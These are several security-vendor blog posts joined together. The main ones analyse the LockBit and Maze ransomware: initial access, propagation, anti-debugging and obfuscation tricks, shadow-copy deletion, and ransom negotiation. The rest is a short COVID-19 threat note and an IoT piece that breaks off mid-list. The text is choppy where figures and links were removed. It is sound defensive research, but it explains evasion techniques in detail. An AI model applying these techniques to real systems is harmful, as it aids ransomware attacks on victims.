As we highlighted previously across two blogs, targeted ransomware attacks have increased massively over the past months. In our 
:\/:
, we discussed the growing pattern of targeted ransomware attacks where the primary infection stage is often an info-stealer kind of malware used to gain credentials/access to determine if the target would be valuable for a ransomware attack. In the 
:\/:
, we described the reconnaissance phase of an attacker that controls an infected host or a valid account to access a remote service. Many of them are using a similar manual modus operandi as we highlighted in the earlier blogs.
:\/:
We believe there is real opportunity to learn from incident response cases and previous attacks, hence why this blog is dubbed ‘tales from the trenches’. In collaboration with 
:\/:
, this article describes a real-life case of a targeted ransomware attack. During one of their recent incident responses, Northwave encountered a relatively new family of ransomware called LockBit performing a targeted attack. First sighted in late 2019, under the name .abcd virus, this piece of ransomware was more a revision than evolution when compared with earlier attacks. Like the previous posts in this blog series, we describe the different stages of the attack and recovery, including a thorough analysis of the ransomware and the attackers behind it.
:\/:
We gathered telemetry through our McAfee Global Threat Intelligence GTI database on the different LockBit samples we analyzed in our research. The global spread is currently limited as this ransomware is relatively new and heavily targeted.
:\/:
As in all ransomware cases, the attacker has to gain initial access to the network somehow. In this particular case the attacker performed a brute force attack on a web server containing an outdated VPN service. Based on our research it took several days for the brute force to crack the password of the ‘Administrator’ account. With this account, belonging to the administrator group, the attacker immediately obtained the proverbial “keys to the kingdom” with all the necessary permissions to perform a successful attack. Unfortunately, this is not a unique case; external facing systems should always have multi-factor authentication enabled when possible. Besides, a security organization should have a least privilege strategy when it comes to accessing systems. Targeted ransomware attackers are successfully leveraging the “human factor” integrally. It is no longer the typical “end-user clicking on a malicious link” causing the complete lock-up of a company. The human factor in targeted ransomware attacks goes much deeper. Attackers successfully leverage weaknesses in security policy and misconfigurations across an entire organization; from end-user to Domain Administrator.
:\/:
To infiltrate the network, the attacker had to take several steps to make sure the ransomware attack was successful. An attacker always wants to infect as many systems as possible to effectively halt the business process and urge the victim to pay the ransom.
:\/:
As mentioned previously, the attacker was successful in guessing the password of the Administrator account using a brute force attack. With this, the attacker immediately had all the necessary privileges for deploying the ransomware successfully. In other cases, as we described in 
:\/:
, the attacker often uses known post-exploitation frameworks, for privilege escalation, lateral movement and performing any additional actions on their objective. Since quite a few of these frameworks are readily available we often call this the “GitHubification” of attack tools. In this case however, the attacker could actually skip this step and continue with the network reconnaissance and deployment of the ransomware immediately, since a high privileged account was already compromised.
:\/:
With the administrator-level account, the attacker used SMB to perform network reconnaissance, resulting in an overview of accessible hosts. Subsequently, the attacker used the internal Microsoft Remote Access Server (RAS) to access these systems using either the administrator or the LocalSystem account. The LocalSystem account is a built-in Windows account. It is the most authoritative account on a Windows local instance (more potent than any admin account). Using these accounts, the attacker owned these systems and could do anything they wanted, including turning off any end-point security products. Interestingly, both the lateral movement and the deployment of the ransomware was entirely automated.
:\/:
This specific case was a classic hit and run. After gaining access to the initial system using the brute-forced administrator account, the attacker logged in and deployed the ransomware almost immediately. For the attacker, this was a relatively straightforward process since the ransomware spreads itself. The deployment of the ransomware on one single host remotely instructed the other hosts in the network to run the following PowerShell command:
:\/:
This command retrieves a .png file from a website that has probably been compromised. There are two versions of the .png file, one for .NET version 4 and one for version 3.5. The PowerShell command checks which version it needs by getting the version number of the common language runtime that is running the current process. If this starts with ‘V4’, the .png for version 4 is downloaded; otherwise it downloads the .png for version 3.5 via the URLs below:
:\/:
What is interesting in this case is that each distinct host downloads the ransomware itself. Hence, the attacker only needed access to one system with an account having enough privileges to automatically make all other hosts in the network download and execute it.
:\/:
The file we found in our investigation was a dropper renamed as a .png file. When first opening the .png files we were expecting a real image file, with perhaps some steganography inside, but what we saw instead was the header of a portable executable, so no steganography pictures this time. The PE was compiled in Microsoft Visual C# v7.0 / Basic .NET, .NET executable -> Microsoft.
:\/:
Entropy-wise it seems quite tidy too, not showing any stray sections or big spikes in the graph. This behavior indicates that the writer of the malware did not use obfuscation.
:\/:
This file is a .NET launcher. Examining the Main() function in the code shows that an array containing a particularly long AES encrypted base64 string (in the variable named ‘exeBuffer’) carries the executable for the actual ransomware.
:\/:
This encrypted string is decrypted using the key ENCRYPTION29942. The first 32 bytes of the long ExeBuffer string are used as the salt in the encryption scheme, where ENCRYPTION29942 is the passphrase.
:\/:
Remarkably, the script checks for the existence of vbc.exe on its designated host. Usually, this binary is a digitally signed executable from Microsoft; however, in this case, the malware uses it for process hollowing.
:\/:
The VBC utility is the visual basic compiler for Windows and LockBit uses it to compile and execute the code on the fly directly in execution. If the vbc utility does not exist on the system, the malware downloads the original vbc.exe file from the same malicious URL as seen before. After executing vbc.exe, the malware replaces the objects in memory with the code for deploying the ransomware (as deduced from the exeBuffer).
:\/:
 refers to the ColorDataProxy COM Object which is classified as the same Bypass method in hfiref0x’s UACME #43
:\/:
In order to be stealthier, LockBit ransomware loads its modules dynamically instead of having them hardcoded in the IAT and uses LoadLibraryA. This method is employed to avoid detection by static engines.
:\/:
In execution, the malware accesses the Service Manager using the function “OpenSCManagerA” and saves the handle. It checks if it fails the last error with the “GetLastError” function, against the error ERROR_ACCESS_DENIED.
:\/:
Upon access to the Service Manager, LockBit creates a thread to manage services, terminate processes and delete the shadow volumes plus the contents of the recycle bin.
:\/:
In this thread the malware has the name of services that it will try to manage hardcoded to try to make them more obfuscated:
:\/:
If one of these services is found by the malware querying the status of it, with the function “QueryServiceStatusEx”, LockBit will get all the depending modules when correct and safe and it will stop the service with the function “ControlService”.
:\/:
LockBit will prepare Unicode obfuscated strings that contain a command to delete the shadow volumes and disable the protections in the next boot of the system.
:\/:
The malware has these strings in the rdata section, as widely observed in all malware families, and in its own code as show in the previous screenshots. The malware uses both strings.
:\/:
During its execution, LockBit will create a snapshot of the processes running in the system and will search to see if certain processes are part of this list with the function “OpenProcess” and, in case the process is present, it will finish it with the “TerminateProcess” function.
:\/:
This “process check function” is performed through a trick using the “PathRemoveExtensionA” function and removing the .exe extension from the list. Using this technique, the check process is more obfuscated.
:\/:
In our analysis, we saw how the ransomware dynamically uses the function “IsWow64Process” to check if the victim OS is running a x64 system and then uses the functions “Wow64DisableWow64FsRedirection” and “Wow64RevertWow64FsResdirection”. If the malware can access the functions, it will use the first to destroy all shadow volumes and the protections of the OS in the next boot and, later, will recover the redirection with the other function. In the case that it cannot get these functions, LockBit will delete the shadow volume directly through the function “ShellExecuteA” or with the function “CreateProcessA”.
:\/:
Static analysis of the sample shows that LockBit will check the machine to see if it has support for  AES instructions in the processor with the “cpuid” opcode.
:\/:
After finishing this process, the malware will try to delete itself with the next command using “ShellExecuteExW”:
:\/:
The ransom note is rather compact because the author hardcoded the content right in the code without using any obfuscation or encryption. The text file containing the ransom note is created in every directory after encryption and called 
:\/:
. The data stored in these keys belongs to the infected victim in order to be able to identify them in the future.
:\/:
Lastly, after finishing the encryption, the desktop wallpaper is changed to a message for the user, saying that LockBit encrypted the host.
:\/:
Some of the ransomware we analyzed shares a common file marker across all the encrypted files in order to verify the origin. This digital marker can be used there in the control panel in order to verify that this was the ransomware that encrypted the files.
:\/:
Analyzing LockBit in our environment, we identified the possibility to spread locally in the same local network. Analyzing the network traffic, we spotted the use of multiple ARP requests to find other hosts in the same network segment.
:\/:
If these ARP requests finally find a host alive, LockBit will start a legitimate SMB connection to be able to deploy the ransomware in other machines.
:\/:
If the SMB connection is successful, LockBit will execute the following PowerShell command to download the .NET launcher that will decompress and execute LockBit in a new system:
:\/:
LockBit is new on the scene, but we noticed the authors added several new features and improved the ransomware several times. That means there is an active group behind it which is probably getting feedback on its actions. This is an example of the development cycle; this graph was extracted, analyzing statically all the internal functions and comparing them across the samples:
:\/:
One of the interesting items we found was that LockBit tries to identify the victim’s geo-location, through the URL IPLO.RU, requesting a static TXT file in that service.
:\/:
The communication to this page is through HTTPS; we intercepted the traffic to get the reply from the remote server:
:\/:
Analyzing statically the code in LockBit, we found that this URL is not resolved dynamically in execution; it is hardcoded in the binary:
:\/:
There are many ways to gain persistence in a system. This first version of LockBit uses a task schedule through the COM interface to gain persistence.
:\/:
The first version of LockBit uses the .abcd extension every time it encrypts a file; this is a unique difference between this version and the other versions found.
:\/:
LockBit’s first version has some files that are skipped in the encryption process and every time it skips one it will create resultlog6.reg with the log information:
:\/:
We analyzed the performance of the encryption and we noted how LockBit uses the CPU heavily in the encryption process:
:\/:
 XO1XADpO01 in its executions and the same mutex is used by LockBit in this first version. We analyzed the base code of both samples and we did not find any code overlap but is a quite a random string to use casually.
:\/:
For this version, LockBit started to append the extension .lockbit in all the encrypted files as a file marker:
:\/:
LockBit, in this new version, removed the functionality whereby it stored all the skipped files in the encryption process.
:\/:
In this version we found LockBit samples packed in UPX and other custom packers, adding certain protections to the samples:
:\/:
The prior version of LockBit used a static mutex in all the encryptions but, in this release, it changed to be a dynamic value for every infection.
:\/:
After all the hunting progress we made, we found several samples of LockBit with some kind of status feature enabled, showing a progress window during the encryption:
:\/:
This mode was only available for certain sample compilations and the status screen was different depending on the LockBit sample analyzed:
:\/:
When we researched the underground community for LockBit we came across a posting on several popular underground forums.  A threat actor named 
:\/:
is offering LockBit as a “bespoke” ransomware as a service for limited partners/affiliates. We suspect LockBit ransomware to be more “bespoke”, not only from its own announcements, but subsequently we have not seen any affiliate identifiers present in the ransomware, which is normally a clear sign of an actor trying to upscale operations and service a larger number of affiliates.
:\/:
The advertisement provides a general description that matches the LockBit behavior we have seen in the wild and from our analysis. As many other cyber-criminal services, LockBit does not allow the use of the software in any of the CIS countries. This is commonly done to avoid prosecution if the threat actor resides in one of those nations.
:\/:
What we also noticed was a mention around multi-threading. Ransomware families are often programmed to run multi-threaded to ensure quick and overall encryption and prevent the encryption process getting stuck on a large file. However, LockBit was specifically advertised as single threaded and the threat actor Lockbi ensures that there are no speed issues when it comes to its encryption capability.
:\/:
In the advertisement it is listed that one of the features of the ransomware is a local subnet scanner and SMB propagation method, something we can confirm based on our analysis.
:\/:
Also noteworthy is the use of a Jabber-bot to perform the essential functions, such as chatting, decryption and banning, replacing the need for a labor intensive admin panel that is hosted somewhere on the internet.
:\/:
It seems that LockBit has joined the underground scene with a clear determination to do business; the authors have put a down a deposit in excess of 10,5 BTC, a bit shy of 75K USD. Putting a deposit in escrow is a way to demonstrate that the seller is invested financially and not out to scam potential partners. The seller would lose their deposit if they did not keep to their end of the deal. Our telemetry shows that LockBit activity is still limited today but we can definitely expect to see more bespoke LockBit attacks in the near future.
:\/:
Going back to the real-life case, there were no recent offline backups. So, with the backup servers (including the backups) encrypted as well and a complete rebuild not being an option, there was no way for a successful and swift recovery other than by paying the ransom.
:\/:
Both McAfee’s and Northwave’s perspective is that ransoms should not be paid. Paying does not only support the criminal business model, but as we have shown in our 
:\/:
In this specific case the victim chose to pay the ransom. The first step for recovery was to get in contact with the hacker following the instructions from the ransom note (Restore-my-files.txt) as depicted below.
:\/:
Interestingly, as opposed to earlier known cases of LockBit (or .abcd virus) where contact with the attacker occurred via email addresses mentioned in the ransom note, in this case, the attacker developed an online ‘help desk’ accessible via a .onion address. Helpful as the hacker is, they even provided clear instructions on how to access this .onion address with the Tor browser. Although the ransom note claims there was private data obtained, Northwave did not find any evidence for this on the compromised systems.
:\/:
The image above shows the helpdesk which the attacker uses for communication with their victims. It provides the functionality for a trial in which two files can be decrypted ‘for warranty’, showing that the attacker indeed has the correct key(s) for restoring the data. For this, it is always essential to test files from different (critical) servers since keys might differ per server. In negotiations with an attacker, always try to obtain this knowledge since it is also relevant for your recovery strategy. If it is only one key, you know you can use one tool for the entire network; however, if encrypted servers use distinct keys, recovery becomes increasingly more difficult.
:\/:
After successful decryption of two different files (from distinct servers), the chat with the attacker began. They started by asking for a network domain name (to identify the correct victim), then the attacker addressed the ransom amount. Usually, the attackers do proper research on their victims and tailor the ransom amount accordingly, which was the case here as well. Hence, negotiating on the amount of the ransom did not prove to be useful:
:\/:
Subsequently, making the bitcoin transaction to the provided address, the helpdesk page would automatically update after six confirmations and show the download link for the decryptor.
:\/:
“After 6 transaction confirmations, in a few hours decryptor will be built automatically. Don’t worry you will get it instantly once it’s built.”
:\/:
Since there was nothing else to do than wait and hope for the decryptor now, an attempt was made into obtaining some more information from the attacker by asking about their methods. See a snippet of this conversation below.
:\/:
The ‘weak passwords’ is, of course, entirely in line with the brute force attack mentioned earlier. Additionally, this conversation indicates that there is a larger group behind this attack, where roles between different participants are separated. The helpdesk seems to be an actual helpdesk, merely following a script of actions.
:\/:
After waiting for several hours and six confirmations further, the decryption tool should have been ready for download. However, this is where things progressed differently. There seemed to be some technical issues causing the decryptor not to generate automatically for which the helpdesk kindly apologized. Unfortunately, this continued for two dubious days with multiple excuses before the attacker sent a link to the decryptor via the chat. It appeared that they were ineffective in solving the technical issues; hence they chose to send it via SendSpace.
:\/:
Once downloaded, the recovery phase could start. In this phase, all servers were decrypted, scanned and cleaned (or rebuilt) in a quarantined network. Subsequently, after implementing the appropriate technical and security measures, each host joined a new clean network.
:\/:
As we highlighted in the first two articles, targeted ransomware attacks have increased massively over the past months. Many of them are all using a similar, quite manual, attack pattern as we highlighted. In this article, we provided an in-depth view of a relatively new ransomware family named LockBit. Based on a real-life case as encountered by Northwave, we described a typical ransomware attack including the modus operandi of attackers, the recovery process, an insight in the underground that advertises the ransomware and a full technical break-down of the ransomware itself. Additionally, during our analysis, we were able to obtain multiple samples of the LockBit ransomware with which we could provide an extensive list of IOCs. McAfee will continue monitoring this threat.

Although the use of global events as a vehicle to drive digital crime is hardly surprising, the current outbreak of COVID-19 has revealed a multitude of vectors, including one in particular that is somewhat out of the ordinary.

The volume of threats related to COVID-19 has been significant, with lures used in all manner of attacks. Tracking these campaigns reveals the most targeted sector is healthcare, followed by finance, and then education.
:\/:
In March 2020 alone, McAfee Labs identified several malicious Android applications abusing keywords connected to the pandemic. The apps range from ransomware samples to spy-agents that spy on the victim’s device. For example, statically analyzing an app called “Corona Safety Mask,” we observe that the amount of permissions is suspicious:
:\/:
Although attribution will clearly be a key concern it is not the primary focus of our research, however there appears to be APT groups incorporating  the COVID-19 theme into their campaigns. For example, spreading documents that talk about the pandemic and are weaponized with malicious macro-code to download malware to the victim’s system.
:\/:
We have seen many examples of major events being abused by people whose interest is only financial gain and current global events are no exception. We conducted a short survey on some underground markets and Telegram channels offering protective masks and more. Two examples are shown below:
:\/:
The use of COVID-19 as a lure does not appear to show any sign of slowing down, indeed there are more campaigns being regularly identified using the global concern for selfish gain.

The Maze ransomware, previously known in the community as “ChaCha ransomware”, was discovered on May the 29th 2019 by Jerome Segura
:\/:
 of the ransomware is to crypt all files that it can in an infected system and then demand a ransom to recover the files. However, the most important characteristic of Maze is the threat that the malware authors give to the victims that, if they do not pay
:\/:
This threat has not been an idle one as the files of one company were indeed released on the Internet. Even though the company sued, the damage was already done. This is a behavior increasingly observed in new ransomware
:\/:
 how ransomware would head in this direction to obtain money from victims who may be reluctant to pay for decryption.
:\/:
On the 29th of October a campaign distributing the Maze malware to Italian users was detected. Historically, the malware has used different techniques to gain entry, mainly using exploits kits, remote desktop connections with weak passwords or via email impersonation or, as in the Italian case, via different agencies or companies
:\/:
, i.e. the Italian Revenue Agency. These emails came with a Word attachment that was using macros to run the malware in the system.
:\/:
The malware is hard programmed with some tricks to prevent reversing of it and to make static analysis more difficult. This report covers these protections and the behavior of the malware in an infected system.
:\/:
The developers have inserted messages to provoke malware researchers, including the email address of Lawrence Abrams, owner of “BleepingComputer”, who they contacted directly. They are very active on social media sites such as Twitter.
:\/:
McAfee protects its customers against the threats that we talk about in this report in all its products, including personal antivirus, endpoint and gateway.
:\/:
The malware is a binary file of 32 bits, usually packed as an EXE or a DLL file. This report focuses on the EXE file.
:\/:
Maze is a complex piece of malware that uses some tricks to frustrate analysis right from the beginning.
:\/:
The malware starts preparing some functions that appear to save memory addresses in global variables to use later in dynamic calls though it does not actually use these functions later. Whether it is residual code existing in the entry point of the malware or a trick to mislead researchers is up for debate.
:\/:
Later, the malware enters in a big block of trash code that also includes some elements to decrypt strings and important information for later. The malware uses some tricks to detect debuggers at this point.
:\/:
”. This field is a Boolean field that is filled from Windows with 1 (True) if the application is running inside of a debugger or 0 (False) if it is not.
:\/:
FIGURE 4. HIGH USE OF THE “ISDEBUGGERPRESENT” PEB FIELD TO DETERMINE IF THE APPLICATION IS RUNNING IN A DEBUGGER
:\/:
If the malware detects a debugger it will remain in an infinite loop without making anything while wasting system resources.
:\/:
The malware gets all processes in the system but ignores the first one (the ‘idle process’ in Windows which is simply a tool to let the user know what percentage of system resources are being used). Using the name of each process it makes a custom name with a custom algorithm, along with a hash that is checked against a hardcoded list. If the hash is found in this list the process will be terminated.
:\/:
It can terminate IDA debugger, x32dbg, OllyDbg and more processes to avoid dynamic analysis, close databases, office programs and security tools.
:\/:
A partial list of the processes that can be cracked using a dictionary list terminated by the malware is shown below:
:\/:
This short list shows the name of the process to kill and the custom hash from the special name generated from the original process name.
:\/:
FIGURE 8. TERMINATEPROCESS FUNCTION TAKEN FROM THE EXPORT ADDRESS TABLE (EAT) OF KERNEL32 AND PASSING THE HASH NAME CHECK
:\/:
The malware will kill the process with the function “TerminateProcess” that it gets from the EAT (Export Address Table) of the module “kernel32.dll” to increase obfuscation, comparing the name with a custom hash taken from the name in high caps.
:\/:
The malware calls Windows functions in a unique way to aid obfuscation, i.e. getting the first process in the system to use the function “Process32FirstW”. However, instead of calling it directly, it puts the parameters needed for the function on the stack, followed by a memory address with a “push” opcode and then makes a direct jump to the Windows function. When the function ends, Windows makes a “ret” opcode then gets the last memory address that the malware pushed inside the stack, returning to this address and continuing the flow. An example of this can be seen in this image:
:\/:
Another ploy utilized by the malware (depending of the sample) is to get the function “DbgUIRemoteBreakin”, using the function “GetProcAddress”, before employing a trick to avoid having a debugger attach to it in runtime
:\/:
The trick used here is “VirtualProtect” to give the function memory address of “DbgUIRemoteBreakin” permission to write to it:
:\/:
After gaining permission, which is granted only for 1 byte, the malware patches this byte with a 0xC3 value (the opcode of “ret”) and restores the previous permissions with “VirtualProtect”, again in the same address and byte, removing the write permission.
:\/:
This is done to avoid having a debugger attach to it in runtime. This way, when a debugger attaches to the process internally, the system calls this function but, instead of creating a thread to start the debugging, the “ret” opcode forces the function to return without creating it. In brief, it prevents a debugger from being attached correctly. It is done before enumerating the system process.
:\/:
The malware checks the language of the machine with function “GetUserDefaultUILanguage” and saves the value in the stack; it is not checked automatically after the call, but it is important later.
:\/:
Maze creates a mutex with the name “Global\x” where x is a special value that is unique per machine. For example, in the next screenshot (some information has been deleted to anonymize the machine used for the analysis) is an example of this behavior. It is done to avoid two or more executions at the same time.
:\/:
The malware, after creating the mutex, makes calls to the function “GetLastError” to check against two errors:
:\/:
0x05 -> ERROR_ACCESS_DENIED. If the malware gets this error, it means that the mutex already exists in the system but, for some reason, the malware cannot access it (perhaps privileges, policies, etcetera).
:\/:
0xb7 -> ERROR_ALREADY_EXISTS. If the malware gets this error, it means that the mutex already exists in the system and can be accessed.
:\/:
If either of the above occur, the malware remains in execution but does not crypt any files in the system or use any resources of the machine. It means that it will appear in the program list using 0% of the processor.
:\/:
The mutex value changes either per sample or on a periodic basis to avoid the possibility of vaccines being made against it. The malware also has a command to avoid the ‘problem’ of vaccines which will be explained later.
:\/:
After the mutex, the malware checks the language previously saved in the stack against, for example, language 0x419 (Russian from the Russian Federation, ru-RU
:\/:
The checks are done in an obfuscated way within the jumble of the code that the malware has (in the virtual machine used here the Spanish language of Spain (es-ES) was used; it is the code 0xC0A that appears in the stack in the screenshot):
:\/:
If the language matches any of those in the list below, the malware will clean the memory and exit the main thread without wasting any resources or making any files.
:\/:
The malware tries to delete the shadow volumes in the system using the “wmic.exe” program with the switches “shadowcopy” and “delete”. Prior to this, the malware gets the function of “WoW64DisableWow64FsRedirection” with “GetProcAddress” and uses it to avoid redirection by default in 64-bit operating systems and calls it in a dynamic way.
:\/:
The malware tries to delete the shadow copies two times, once before crypting the files in the infected system and secondly after crypting them.
:\/:
This execution is done with the function “CreateProcessW” but, to increase the level of obfuscation, the malware is launched with this command:
:\/:
As you can see in the image above, the malware uses a command with the name of folders that do not exist by default in Windows, except “Windows”, “system32” and “wbem”. It enters these folders but then promptly exits them using the command “..”, meaning it returns to the previous folder in the path.
:\/:
For example, in the beginning it enters the folders “ydw” and “fdygg” but later returns to the root of the Windows installation unit with two “..” commands that lead to “C:\” in this case. It later concatenates with the “Windows” folder and continues with the same behavior to finally enter into “system32” where it calls the “wmic.exe” program with the switches to delete the shadow volumes. This is done to try obfuscating this call, though such suspicious behavior may cause an antivirus program to stop it anyway, but it is proof that the malware coders have skills in programming and a good understanding of Windows behavior.
:\/:
It is important to understand that this “path” used in the command with non-existent folders is random and does not need to use the same number of folders to make the obfuscation.
:\/:
After the deletion process, the malware gets the function “Wow64RevertWow64FsRedirection” using the function “GetProcAddress” and calls it in a dynamic way to leave the system in the same state as before.
:\/:
Maze affects network resources too, using the functions “WNetOpenEnumW”, “WNetEnumResourceW”, “WNetCloseEnum” and “WNetAddConnection2W”.
:\/:
The malware uses two algorithms to crypt the files, ChaCha which is based on the Salsa20 algorithm that is symmetric and, for protection, an RSA algorithm that is asymmetric
:\/:
In each execution the malware creates a Public BLOB of one RSA key that will be used to crypt the part that holds the information to decrypt the files, and one Private BLOB with an RSA key that allows decryption of the information crypted with the public RSA blob created previously.
:\/:
Just like other ransomware, this malware has an RSA Public BLOB embedded that will be imported to protect the RSA private BLOB of the victim. Only the malware developers have the RSA private blob to decrypt their public RSA Blob.
:\/:
This key is protected with a crypto using a key of 32 bits and iv of 8 bytes using the function “CryptGenRandom” to avoid memory dumps but, later, it will need to be decrypted before use.
:\/:
After this, the malware starts the procedure of crypting the files, searching in units, before importing the RSA public BLOB key generated in runtime. After this, it creates the ransom note prepared for this infected machine in the root folder and then starts looking for folders and files to crypt.
:\/:
Check the existence of the file with the function “SetFileAttributesW” with the attribute “FILE_ATTRIBUTE_ARCHIVE”.
:\/:
Open the file with read and write permissions with the function “CreateFileW” with the flag “OPEN_EXISTING”.
:\/:
Get the file size with the function “GetFileSizeEx” (it is important for managing big files, “GetFileSize” is not good for bigger files).
:\/:
Generate a new random extension for the victim file. Each file has a different extension but does not lose the original extension; the new one is appended to the old one. For example, “1.zip” becomes “1.zip.gthf”.
:\/:
Crypt the file with the ChaCha algorithm and the key and iv with the RSA public key generated in runtime.
:\/:
Rename the file with the function “MoveFileExW”. That way it is not possible to use forensic tools to recover the files because they use the same sector on the raw disk. The malware does not delete the file using the function “DeleteFileW” and later create a new one with the crypted data. Instead, all changes are applied in the mapping directly, in memory, without using a file pointer on the disk to read and write, which makes the process much quicker.
:\/:
However, it does crypt the file “ntuser.ini” to prevent other ransomwares from crypting it. It creates the ransom note in each folder that it can.
:\/:
The malware tries to make connections to IP addresses that have been crypted in the binary to send information about the infected machine, as seen below:
:\/:
It is important to take into consideration that the malware forges the POST string to make the connection with a random choice from a list of possible strings such as “forum”, “php”, “view”, etc., to make detection harder with IPS or other filters on the network.
:\/:
The IP addresses are detected as from the Russian Federation but that does not prove that the malware came from this country; it could be deliberate misdirection but, with the language checks of CIS countries, it certainly appears possible.
:\/:
The use of IP addresses instead of domain names is to avoid DNS resolutions that can be altered or redirected to a loopback, for example using the “host” file in Windows. This makes the trace of IPs more complicated and avoids having the connection blocked.
:\/:
From a memory dump we can extract the IPs used by these connections, as well as a curious string that talks about Lawrence Abrams, the admin of the web site “bleepingcomputer” who was contacted directly by the developers. It is not known why they included this email address because it has no relation to the ransom note and is not used anywhere else. Perhaps it is a means of mocking the administrator of a site that frequently reports on ransomware?
:\/:
Maze has some strings in memory that are interesting and something that may be worth further analysis in the future:
:\/:
The webpage for making the payment requested in the ransom note gives a price and verifies that all is correct.
:\/:
Maze has a chat function to contact the operators and receive information about how to obtain the cryptocurrency required to make payment.
:\/:
Of course, as with many types of ransomware, there is an offer to decrypt three images for free and that service has been verified as working:
:\/:
The malware has some switches that can be used in the command line to launch. These switches can either disable some elements or enable logging.
:\/:
–nomutex -> This switch prevents checking the mutex so that it can run more than one instance on the same machine. It can also be used to avoid vaccines that are made before the malware creates the mutex name in the machine.
:\/:
–path x -> Where x is a full path. In this case the malware will crypt all files in all folders starting from this path unless they are blacklisted names, extensions or folder names. This is useful for the malware developers to attack a special path instead of losing time going after a full machine and it makes the attack more targeted.
:\/:
–logging -> If this switch is enabled the malware will log all the steps it makes. Useful to the malware developers in debug environments, or in the attack phase to know that all was ok, step by step. Here is a small example of this information:
:\/:
In January 2020 a new version of the malware appeared with a special text dedicated to some researchers in the security field. The malware developers appear to have chosen those individuals to be provocative and make fun of them.
:\/:
 on the 28th of January 2020. The sample has some differences when compared with the previous one that was analyzed in this report. Those differences will be covered later via another sample that was found by Luca Nagy
:\/:
The most important thing here is that the developers appear to have carefully selected the researchers and waited for them to answer as a psychological trick, and it worked, because all of them replied, trolling the malware developers over the version of their malware detected on the 28th.
:\/:
Here is one response from a malware developer to this trolling that contains some interesting facts:
:\/:
It is not known if one person is behind the malware or not. It is curious that they said “I” instead of “we” twice in their answer. So, perhaps it was written by one person for trolling purposes, or perhaps the developer of the malware really is only one person (or they want researchers to think that is the case).
:\/:
Another important fact in the note is the talk about the tools used by one of the researchers for regular malware analysis. Why are they mentioning regular malware analysis? Is it because they are reversing malware themselves for fun or could it be their day job? Could it be that perhaps the developer is a researcher (because of the way that they talk with others and provoke them)? Secondly, malware analysis is mentioned more than once and, thirdly, they said that they made an IDAPython script to remove all obfuscated code that the malware has (the ransomware may have got the name ‘Maze’ because of how analysis of it is like walking through a labyrinth). So, it may be either a researcher who knows IDAPro very well or is an advanced developer (and the obfuscated code in Maze is very well done) or perhaps it is a developer that has another job in normal life besides the creation of malware? Of course, these are just possibilities, not facts.
:\/:
The malware developer achieved their goal with this interaction as their target audience saw the answer and talked about their malware, as noted in the final line of their response “ …but you need to know that we love you researchers without you our job also would be fuc**** boring as hell”.
:\/:
It is curious that here they said “we” instead of “I” as before but perhaps they were talking about all malware development?
:\/:
Usually comes as a DLL instead of an EXE file. It does not run on Windows operating systems older than Vista as this makes analysis harder. By using the malware as a DLL, they can inject this module into a target process more easily than if they use an EXE sample of the malware.
:\/:
Instead of deleting the “Shadow Volumes” the developers instead use WMIC with the special trick of the path as mentioned earlier, using WMIC classes to control the Shadow Volumes. An example of this use can be seen in the next image.
:\/:
Each sample of the malware uses different strings as PDB to send messages or to make the sample unique, for example:
:\/:
(In these examples some things were removed or changed to remove sensitive information in the report).
:\/:
The samples’ compile dates are from the 24th of January 2020 (the first version with the strings that provoked the researchers) to the 28th of January 2020 (the version with the answers to the researchers), meaning they were made on the same day the responses to the previous version were published on Twitter.
:\/:
Another interesting fact from the later sample is that, besides it saying that the language code used to program it was Korean, the IPs where it connects belong to the Russian Federation as before, as can be seen in the next two images.
:\/:
It is impossible to know the truth, but this could be a trick to try misleading researchers into thinking that the malware comes from some country when in truth it originates in another. It is known that malware developers often check the language on potential victim’s machines to avoid the CIS countries, so we can guess that the check for the “Korean” language was a trick designed to mislead, but it is impossible to know that for sure. Of course, the “Korean” language can be changed manually, or it could be a Korean packer, but it is impossible to say with certainty.
:\/:
Maze is a ransomware created by skilled developers. It uses a lot of tricks to make analysis very complex by disabling disassemblers and using pseudocode plugins.
:\/:
It poses a big problem to individuals and enterprises that do not pay as the developers threaten to release the information if they do not receive payment and they do indeed keep their word on that. More and more ransomwares are exhibiting the same behavior and we expect to see more of it this year and perhaps further into the future too.
:\/:
The malware developers are active on social media sites, such as Twitter, and they are familiar with the work of malware researchers. They also know how to provoke them perfectly and they like to play cat and the mouse with them.
:\/:
We recommend making periodic backups of files and keeping them isolated off the network and having an always updated antivirus in place. The latest software patch should also be applied. Remote Desktop Connections that are not needed should be avoided.
:\/:
Avoid suspicious emails and do not open attachments that come from anyone that you do not know. The same goes for links in emails and, even if they come from a known source, check with the sender if you have any doubts. Also, disable macros in Office programs and never enable them unless it is essential to do so.
:\/:
McAfee protects against this threat in all its products, including personal antivirus, endpoint and gateway.

:\/:
This week McAfee Advanced Threat Research (ATR) published new findings, uncovering security flaws in two popular IoT devices: a connected garage door opener and a “smart” ring, which, amongst many uses, utilizes near field communication (NFC) to open door locks.
:\/:
I’d like to use these cases as examples of a growing concern in the area of product security. The industry of consumer devices has seen some positive momentum for security in recent years. For example, just a few years back, nearly every consumer-grade router shipped with a default username and password, which, if left unchanged, represented a serious security concern for home networks. At a minimum, most routers at least now ship with a unique password printed on the physical device itself, dramatically increasing the overall network security. Despite positive changes such as this, there is a long way to go.
:\/:
If we think about the history of garage doors, they began as a completely manual object, requiring the owner to lift or operate it physically. The first overhead garage door was invented in the early 1920s, and an electric version came to market just a few years later. While this improved the functionality of the device and allowed for “remote” entry, it wasn’t until many years later that an actual wireless remote was added, giving consumers the ability to allow wireless access into their home. This was the beginning of an interesting tradeoff for consumers – an obvious increase in convenience which introduced a potential new security concern.
:\/:
The same concept applies to the front door. Most consumers still utilize physical keys to secure the front door to their homes. However, the introduction of NFC enabled home door locks, which can be opened using compatible smart rings, adds both convenience and potentially compromised security.
:\/:
For example, upon investigating the McLear NFC Ring, McAfee ATR uncovered a design insecurity, which could allow an attacker to easily clone the NFC Ring and gain entry to a home utilizing an NFC enabled smart lock.
:\/:
While the NFC Ring modernizes physical household security, the convenience that comes with technology implementation also introduces a security issue.
:\/:
The issue here is at a higher level; where and when do we draw the line for convenience versus security? The numerous benefits technology enhancements bring are exciting and often highly valuable; but many are unaware of the lengths cyber criminals will go to (for example, 
:\/:
we once uncovered a vulnerability in a coffee pot which we were able to leverage to gain access to a home Wi-Fi network
:\/:
As we move towards automation and remote access to nearly every computerized system on the planet, it’s our shared responsibility to maintain awareness of this fact and demand a higher bar for the products that we buy.
:\/:
So what can be done? The responsibility is shared between consumers and manufacturers, and there are a few options:
:\/:
